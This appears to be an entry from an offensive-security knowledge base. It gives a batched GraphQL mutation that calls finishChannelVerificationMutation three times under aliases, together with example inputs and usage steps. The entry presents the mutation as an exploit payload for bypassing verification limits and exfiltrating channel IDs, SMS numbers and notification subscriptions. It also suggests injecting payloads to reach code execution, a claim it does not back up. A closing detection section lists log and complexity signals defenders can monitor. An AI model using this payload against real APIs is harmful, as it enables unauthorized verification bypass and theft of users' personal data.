---
type: code
language: graphql
verified: true
tags:
  - graphql
  - batching
  - mutation
  - exploit
platforms:
  - Web
  - API
validated: true
---

# Batched-finishChannelVerificationMutation-GraphQL-Query

## Code

```graphql
mutation finishChannelVerificationMutation(
  $input FinishChannelVerificationInput!,
  $input2 FinishChannelVerificationInput!,
  $input3 FinishChannelVerificationInput!,
){
  first: finishChannelVerificationMutation(input: $input){
    channel{
      id
      option{
        ... onChannelSmsOptions{
          number
        }
      }
      status
      notificationSubscription(last: 1000){ etc...  }
    }
  }


  second: finishChannelVerificationMutation(input: $input2){...}
  third: finishChannelVerificationMutation(input: $input3){...}
}
```

## Description

This GraphQL code snippet demonstrates a batched mutation exploiting the finishChannelVerificationMutation endpoint. It executes three concurrent mutations (first, second, third) on different inputs, allowing simultaneous channel verification, data modification, and extraction of nested fields like channel IDs, SMS options (numbers), status, and up to 1000 notification subscriptions. The "etc..." placeholder indicates expandable fields for further data exfiltration. This payload is used in GraphQL injection attacks to chain operations and bypass single-query limitations.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $input | First FinishChannelVerificationInput object (e.g., channel ID and verification code for target 1) | {"channelId": "chan-1", "verificationCode": "123456", "status": "verified"} |
| $input2 | Second FinishChannelVerificationInput for parallel mutation (target 2) | {"channelId": "chan-2", "verificationCode": "789012", "option": {"type": "sms"}} |
| $input3 | Third FinishChannelVerificationInput for additional parallel execution (target 3) | {"channelId": "chan-3", "verificationCode": "345678", "notificationSubscription": {...}} |

## Usage

Substitute the variables with schema-specific payloads and send via POST to the GraphQL endpoint using [[commands/curl-send-graphql-mutation]]. This is typically used after schema reconnaissance to verify multiple channels or exfiltrate data in one request. For escalation, inject payloads into input fields if the backend lacks sanitization (e.g., for arbitrary code execution).

## Detection

- Monitor GraphQL logs for batched queries with multiple aliases (e.g., first/second/third) or high complexity (last: 1000).
- Detect unusual variable counts or nested field expansions in mutations.
- Alert on rapid successive verifications or data fetches from notificationSubscription.
- Use query analyzers to flag mutations exceeding depth/complexity thresholds.

## Related

- [[procedures/Exploit-GraphQL-Batching-Vulnerability-with-finishChannelVerificationMutation]]
- [[curl-send-graphql-mutation]]
